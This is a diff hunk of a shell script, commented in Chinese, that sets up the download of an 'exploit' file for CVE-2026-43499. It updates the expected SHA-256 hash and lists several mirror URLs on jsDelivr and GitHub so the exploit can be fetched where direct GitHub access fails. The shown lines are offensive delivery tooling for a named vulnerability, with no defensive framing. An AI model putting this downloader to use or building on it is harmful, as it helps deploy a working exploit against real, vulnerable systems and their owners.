@@ -5,15 +5,15 @@
 
 cd ~/cve_2026_43499 2>/dev/null || { echo "[!] cd 失败, 请先创建 ~/cve_2026_43499"; exit 1; }
 
-EXP_HASH="f664da2b7a70c655b87ad13c0eab9bc93377e5066c5cb41747b29b86ec96cbbe"
+EXP_HASH="63d396ed48931e11fd5156c24afdbfad6abdfaed0745299e0af8b762683f0df6"
 
 # 多通道 (commit 113a552 = v2.5):
 # 1. jsDelivr CDN (国内一般可达)
 # 2. github.com raw 路径 (不走 raw.githubusercontent.com)
 # 3. raw.githubusercontent.com (直连, 有时可达)
 CHANNELS='
-https://cdn.jsdelivr.net/gh/1332915/-10e-@37c6367/cve_2026_43499/exploit
-https://github.com/1332915/-10e-/raw/37c6367/cve_2026_43499/exploit
+https://cdn.jsdelivr.net/gh/1332915/-10e-@__C__/cve_2026_43499/exploit
+https://github.com/1332915/-10e-/raw/__C__/cve_2026_43499/exploit
 https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/exploit
 '
 
